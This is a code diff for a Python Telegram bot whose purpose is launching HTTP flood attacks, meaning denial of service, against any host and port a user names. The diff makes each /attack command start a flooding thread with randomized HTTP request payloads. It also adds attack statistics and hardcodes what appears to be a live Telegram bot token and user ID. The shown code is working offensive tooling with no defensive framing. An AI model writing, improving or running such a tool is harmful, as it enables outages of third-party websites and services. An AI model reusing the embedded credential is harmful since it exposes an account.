@@ -20,7 +20,7 @@ from datetime import datetime, timedelta
 # ======================
 # CONFIGURATION SECTION
 # ======================
-API_TOKEN = os.getenv("7233414815:AAHhlUfOAiD8SLJNRNWlY4SJ_PV3wZf-GhY") or "YOUR_TOKEN_HERE"
+API_TOKEN = "7233414815:AAHhlUfOAiD8SLJNRNWlY4SJ_PV3wZf-GhY"  # Your Telegram bot token
 AUTHORIZED_USERS = [5421063181]  # Add your Telegram user ID
 MAX_CONCURRENT_ATTACKS = 3
 MAX_REQUESTS_PER_ATTACK = 10000
@@ -68,7 +68,6 @@ def authorize_user(user_id):
 class AttackManager:
     def __init__(self):
         self.lock = Lock()
-        self.attack_log = []
         
     def generate_payload(self, host):
         """Create randomized HTTP payloads"""
@@ -82,7 +81,7 @@ class AttackManager:
         ])
         return f"{random.choice(methods)} {path} HTTP/1.1\r\n{headers}\r\n\r\n".encode()
 
-    def attack_worker(self, target, port, duration):
+    def attack_worker(self, attack_id, target, port, duration):
         """Managed attack thread with resource limits"""
         start_time = time.time()
         try:
@@ -128,7 +127,8 @@ class AttackManager:
         finally:
             for s in sock_pool:
                 s.close()
-            return f"Attack completed: {int(time.time() - start_time)}s duration"
+            stats['completed_attacks'] += 1
+            print(f"Attack {attack_id} completed: {int(time.time() - start_time)}s duration")
 
 # ======================
 # BOT HANDLERS
@@ -179,6 +179,9 @@ def handle_attack(message):
         }
         user_cooldown[message.from_user.id] = datetime.now()
         
+        # Start attack in a separate thread
+        Thread(target=manager.attack_worker, args=(attack_id, target, port, duration), daemon=True).start()
+        
         bot.reply_to(message, f"🚦 Attack queued: {target}:{port} for {duration}s")
         
     except Exception as e:
@@ -200,12 +203,21 @@ def stop_attack(message):
     try:
         target = message.text.split()[1]
         to_remove = [aid for aid, attack in active_attacks.items() 
-                    if attack['target'] == target]
+                     if attack['target'] == target]
         for aid in to_remove:
             del active_attacks[aid]
         bot.reply_to(message, f"🛑 Stopped {len(to_remove)} attacks on {target}")
     except:
         bot.reply_to(message, "Usage: /stop <target>")
+
+@bot.message_handler(commands=['stats'])
+def show_stats(message):
+    stats_message = (
+        f"Total Attacks: {stats['total_attacks']}\n"
+        f"Blocked Requests: {stats['blocked_requests']}\n"
+        f"Completed Attacks: {stats['completed_attacks']}"
+    )
+    bot.reply_to(message, stats_message)
 
 # ======================
 # MAIN EXECUTION
@@ -225,14 +237,9 @@ if __name__ == "__main__":
         level=logging.INFO
     )
     
-    # Start attack workers
-    manager = AttackManager()
-    for _ in range(MAX_CONCURRENT_ATTACKS):
-        Thread(target=manager.attack_worker, daemon=True).start()
-    
     # Start bot
     try:
-        bot.infinity_polling(drop_pending_updates=True)
+        bot.infinity_polling()
     finally:
         fcntl.flock(lock_file, fcntl.LOCK_UN)
         lock_file.close()
